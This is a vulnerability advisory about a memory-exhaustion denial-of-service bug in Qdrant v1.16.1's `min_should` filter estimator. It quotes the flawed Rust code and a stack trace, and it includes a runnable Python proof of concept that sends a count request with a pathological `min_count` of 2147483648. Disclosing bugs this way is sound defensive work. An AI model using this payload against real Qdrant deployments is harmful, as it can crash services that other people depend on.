Qdrant min_should min_count leads to DoS and potential panic

- **Product**: Qdrant
- **Affected Version**: v1.16.1
- **Component**: Payload filtering cardinality estimator and optimizer for `min_should` filters
- **Impact Type**: Denial of Service (memory), potential panic depending on runtime
- **Severity**: High (DoS). 

## Summary
Qdrant’s estimation path for `min_should` filters enumerates all size-`k` combinations of the underlying conditions and materializes them, which is combinatorially expensive and unbounded. When `min_count` is set to an extremely large number, iterator state proportional to `min_count` may be created, which can trigger allocation failures or panics on some platforms. The code contains no sanity checks for `min_count` relative to the number of conditions.

## Vulnerable Code

```rust
//lib/segment/src/index/query_estimator.rs
pub fn combine_min_should_estimations(
    estimations: &[CardinalityEstimation],
    min_count: usize,
    total: usize,
) -> CardinalityEstimation {
    /*
    | First estimate cardinality of intersections and then combine the estimations
    | ex) min_count : 2, # of estimations : 4
    | |(A ⋂ B) ∪ (A ⋂ C) ∪ (A ⋂ D) ∪ (B ⋂ C) ∪ (B ⋂ D) ∪ (C ⋂ D)|
     */
    let intersection_estimations = estimations
        .iter()
        .combinations(min_count)
        .map(|intersection| {
            combine_must_estimations(&intersection.into_iter().cloned().collect_vec(), total)
        })
        .collect_vec();

    combine_should_estimations(&intersection_estimations, total)
}
```

- Callers:

```
   6: alloc::raw_vec::capacity_overflow
   7: segment::index::query_estimator::combine_min_should_estimations
   8: segment::index::query_estimator::estimate_filter
   9: <segment::index::struct_payload_index::StructPayloadIndex as segment::index::payload_index_base::PayloadIndex>::estimate_cardinality
  10: segment::segment::scroll::<impl segment::segment::Segment>::should_pre_filter
  11: segment::segment::entry::<impl segment::entry::entry_point::SegmentEntry for segment::segment::Segment>::read_filtered
```

## Proof of Concept (PoC)

- Endpoint: `POST /collections/{collection}/points/count` with `filter.min_should`.
- Minimal PoC (2 conditions, pathological `min_count`):

```python
import requests, json, time

BASE = "http://localhost:6333"
COLL = "fuzz_repro_min_should"
HEAD = {"Content-Type": "application/json"}

def create_collection():
    requests.put(f"{BASE}/collections/{COLL}", headers=HEAD, json={
        "vectors": {"size": 4, "distance": "Cosine"}
    })

def upsert_points():
    body = {"points": [
        {"id": 1, "vector": [0,0,0,0], "payload": {"word": "ant", "two_words": "blue lizard"}},
        {"id": 2, "vector": [0,0,0,0], "payload": {"word": "ant", "two_words": "green cat"}},
    ]}
    requests.put(f"{BASE}/collections/{COLL}/points", headers=HEAD, json=body)

def count_with_filter_min_should(min_count):
    body = {
        "filter": {
            "min_should": {
                "conditions": [
                    {"key": "two_words", "match": {"value": "lizard"}},
                    {"key": "word", "match": {"value": "ant"}}
                ],
                "min_count": min_count
            }
        },
        "exact": True
    }
    r = requests.post(f"{BASE}/collections/{COLL}/points/count", headers=HEAD, json=body, timeout=1000)
    print(f"count(min_should.min_count={min_count}):", r.status_code)
    try: print(json.dumps(r.json(), indent=2))
    except: print(r.text)

if __name__ == "__main__":
    create_collection()
    upsert_points()
    # Large values demonstrate severe latency and may trigger allocator failure on some builds
    count_with_filter_min_should(2147483648)
```

## Impact

Remote unauthenticated attacker can craft `filter.min_should` to exhaust memory and possibly crash the process, depending on allocator/platform/runtime settings and the magnitude of `min_count` and/or `n`.
